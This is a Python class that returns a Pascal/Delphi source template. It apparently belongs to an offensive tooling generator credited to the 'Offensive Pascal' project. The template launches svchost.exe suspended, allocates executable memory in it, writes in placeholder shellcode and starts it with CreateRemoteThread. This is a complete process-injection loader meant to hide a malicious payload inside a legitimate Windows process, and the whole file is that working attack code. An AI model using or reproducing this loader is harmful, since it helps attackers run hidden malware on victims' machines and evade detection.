class spawnandinject:

    def imports(self) -> list[str]:
        return ['Classes', 'windows', 'sysutils']

    def compilerOptions(self) -> list[str]:
        return []

    def template(self) -> str:
        return """
{{
    this one is part of repo published on github under the name of Offensive Pascal
    Pascal is a great and still up to date :)
    these projects can be compilied using FreePascal (FPC)
    or Delphi

    author : @zux0x3a
    site :   0xsp.com / ired.dev

    https://github.com/0xsp-SRD/OffensivePascal

}}

program output;

{{$mode delphi}}

uses {imports};

{codeblocks}

procedure main;

var
    pi: TProcessInformation;
    si: TStartupInfo;
    shellcode : array of byte;
    hThread: Handle;
    addr: LPVOID;

begin

    ZeroMemory(@si, SizeOf(si));
    si.cb := SizeOf(si);
    ZeroMemory(@pi, SizeOf(pi));

    CreateProcessA(nil, PAnsiChar('c:\\windows\\system32\\svchost.exe'), nil, nil, False, CREATE_SUSPENDED, nil, nil,  si, pi );

    {shellcode}
    {transformers}
    addr := VirtualAllocEx(pi.hProcess, nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READ);

    WriteProcessMemory(pi.hProcess, addr, @shellcode[0], {shellcodeSize}, nil);

    hThread := CreateRemoteThread(pi.hProcess, nil, 0, addr, nil, 0, nil);

    WaitForSingleObject(hThread, 500);
end;

begin
    main;
end.
"""